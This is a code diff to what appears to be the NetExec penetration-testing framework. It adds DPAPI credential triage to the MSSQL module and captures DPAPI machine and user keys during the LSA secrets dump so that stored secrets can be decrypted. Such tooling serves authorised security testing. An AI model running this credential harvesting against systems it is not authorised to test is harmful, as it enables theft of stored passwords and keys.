@@ -1,6 +1,7 @@
 import os
 import random
 import contextlib
+import binascii
 from termcolor import colored
 
 from nxc.config import process_secret, host_info_colors
@@ -11,7 +12,10 @@ from nxc.logger import NXCAdapter
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.helpers.negotiate_parser import parse_challenge, login7_integrated_auth_error_message
 from nxc.helpers.powershell import create_ps_command
+from nxc.helpers.dpapi import DPAPITriage
 from nxc.protocols.mssql.mssqlexec import MSSQLEXEC
+
+from dploot.lib.network.mssql import MSSQLTarget as Target
 
 from impacket import tds, ntlm
 from impacket.krb5.ccache import CCache
@@ -44,6 +48,10 @@ class mssql(connection):
         self.lmhash = ""
         self.nthash = ""
         self.no_ntlm = False
+        self.dpapi_system_key = None
+        self.no_da = None
+
+        self._dpapi_triage = None
 
         connection.__init__(self, args, db, host)
 
@@ -616,12 +624,44 @@ class mssql(connection):
             self.logger.display("Dumping LSA secrets")
             local_operations = LocalOperations(f"{output_filename}.system")
             boot_key = local_operations.getBootKey()
+
+            def lsa_secret_callback(_, secret):
+                self.logger.highlight(secret)
+                if "dpapi_machinekey" in secret:
+                    correl_table = {"dpapi_machinekey": "MachineKey", "dpapi_userkey": "UserKey"}
+                    self.dpapi_system_key = {correl_table[k]: binascii.unhexlify(v[2:]) for k, v in (elem.split(":") for elem in secret.splitlines())}
             LSA = LSASecrets(
                 f"{output_filename}.security",
                 boot_key,
                 None,
                 isRemote=None,
-                perSecretCallback=lambda secret_type, secret: self.logger.highlight(secret),
+                perSecretCallback=lsa_secret_callback,
             )
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
+
+    @requires_admin
+    def dpapi(self):
+        self.dpapi_triage.triage_dpapi()
+
+    @property
+    def dpapi_triage(self) -> DPAPITriage:
+        if self._dpapi_triage is not None:
+            return self._dpapi_triage
+
+        target = Target.create(
+            domain=self.domain,
+            username=self.username,
+            password=self.password,
+            address=self.remoteName,
+            port=self.port,
+            hashes=f":{self.nthash}",
+            do_kerberos=self.kerberos,
+            kdcHost=self.kdcHost,
+            use_kcache=self.use_kcache,
+            aesKey=self.aesKey,
+            db_auth=self.args.local_auth,
+        )
+
+        self._dpapi_triage = DPAPITriage(self, target)
+        return self._dpapi_triage
